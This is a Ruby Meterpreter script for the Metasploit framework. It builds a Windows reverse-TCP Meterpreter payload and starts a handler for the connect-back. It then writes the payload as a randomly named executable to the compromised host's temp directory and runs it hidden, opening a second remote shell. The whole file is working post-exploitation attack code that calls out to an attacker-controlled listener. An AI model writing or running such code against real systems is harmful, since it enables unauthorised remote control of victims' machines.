# Meterpreter script for uploading and executing another meterpreter exe

info = "Simple script for upload and executing an additional meterpreter payload"

# Options
opts = Rex::Parser::Arguments.new(
	"-h" => [false, "This help menu. Spawn a meterpreter shell by uploading and executing."],
	"-r" => [true , "The IP of a remote Metasploit listening for the connect back"],
	"-p" => [true,  "The port on the remote host where Metasploit is listening(default:4444)"]
)

filename = Rex::Text.rand_text_alpha(rand(8)+6) + ".exe"
rhost    = Rex::Socket.source_address("1.2.3.4")
rport    = 4444

lhost    = "127.0.0.1"

pay	 = nil

opts.parse(args) do |opt, idx, val| 
	case opt
		when "-h"
			print_line(info)
			print_line(opts.usage)
			raise Rex::Script::Completed
		when "-r"
			rhost = val
		when "-p"
			rport = val.to_i
	end
end

payload = "windows/meterpreter/reverse_tcp"
pay	= client.framework.payloads.create(payload)
pay.datastore['LHOST'] = rhost
pay.datastore['LPORT'] = rport

mul	= client.framework.exploits.create("multi/handler")
mul.share_datastore(pay.datastore)
mul.datastore['WORKSPACE'] = client.workspace
mul.datastore['PAYLOAD']   = payload
mul.datastore['EXITFUNC']  = 'process'
mul.datastore['ExitOnSession'] = true
mul.exploit_simple(
	'Payload'	=> mul.datastore['PAYLOAD'],
	'RunAsJob'	=> true
)

print_status("ready")
print_status(client.platform)

#if client.platform = ~/win32|64/
if client.platform == 'windows'
	print_status("ok")
	tempdir = client.fs.file.expand_path("%TEMP%")
	print_status("Uploading meterpreter to temp directory...")
	raw = pay.generate
	exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
	tempexe = tempdir + "\\" + filename
	tempexe.gsub!("\\\\", "\\")
	fd = client.fs.file.new(tempexe, "wb")
	fd.write(exe)
	fd.close
	print_status("Executing the payload on the system...")
	execute_payload = "#{tempdir}\\#{filename}"
	pid = session.sys.process.execute(execute_payload, nil, {'Hidden' => true})
end

